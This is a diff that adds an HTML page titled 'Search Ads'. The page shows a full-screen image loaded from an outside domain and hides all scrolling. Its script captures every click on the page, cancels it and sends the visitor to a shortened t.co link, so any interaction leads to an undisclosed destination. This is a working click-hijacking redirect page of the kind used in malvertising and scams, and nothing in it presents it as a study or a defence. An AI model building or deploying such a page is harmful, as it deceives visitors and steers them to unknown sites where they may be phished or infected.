@@ -1,0 +1,58 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    
+    <title>Search Ads</title>
+
+    <!-- Google Analytics -->
+    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-LEV1CEETJV"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+        gtag('config', 'G-LEV1CEETJV');
+    </script>
+
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        .full-page-overlay {
+            background-image: url('https://r2991.com/a.webp'); 
+            background-size: cover; 
+            background-position: center; 
+            width: 100vw;
+            height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 10; 
+            opacity: 1; 
+            pointer-events: none;
+        }
+    </style>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var redirectUrl = "https://t.co/lw2J3VtnGu"; // Change to your desired URL
+
+            document.addEventListener('click', function(event) {
+                event.preventDefault(); // Prevents default action
+                console.log("Click detected! Redirecting..."); // Debugging log
+                setTimeout(function() {
+                    window.location.href = redirectUrl;
+                }, 300); // Small delay for smooth redirection
+            });
+        });
+    </script>
+</head>
+<body>
+    <!-- Full-page image overlay -->
+    <div class="full-page-overlay"></div>
+
+
+</body></html>
